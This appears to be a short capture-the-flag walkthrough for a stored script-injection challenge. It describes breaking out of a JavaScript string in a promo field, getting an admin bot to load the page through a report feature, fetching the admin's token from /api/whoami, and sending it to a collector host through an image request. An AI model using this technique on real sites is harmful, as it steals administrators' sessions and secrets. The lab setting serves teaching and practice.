Break out of the string, run your code, then tidy up the leftovers so the script
still parses. The template is:

```js
var promo = '<YOUR-VALUE>';
```

Start your value with `'` to close the (now empty) string, `;` to end the
statement, then your JavaScript, then `//` to comment out the trailing `';` the
server appends. Angle brackets are not needed anywhere — good, because they are
stripped.

Whose browser is worth running code in? Not yours. `POST /report` (the "report a
checkout link to staff" feature) queues a same-site path that the **admin bot**
then visits, carrying its `session` cookie. Your code runs in the admin's
session.

And what is worth reading from there? `GET /api/whoami` returns `{"user":"guest"}`
to you — but to a request that carries the admin cookie it returns
`{"user":"admin","token":"<32 hex>"}`. A **same-origin** `fetch('/api/whoami',
{credentials:'include'})` from inside the admin's browser sends that cookie
automatically. How do you get the response out to a host you can read? The only
listener the bot's network can reach is the collector at
`http://collector:9000/` — and `new Image().src = ...` fires a GET to it with no
CORS worries.
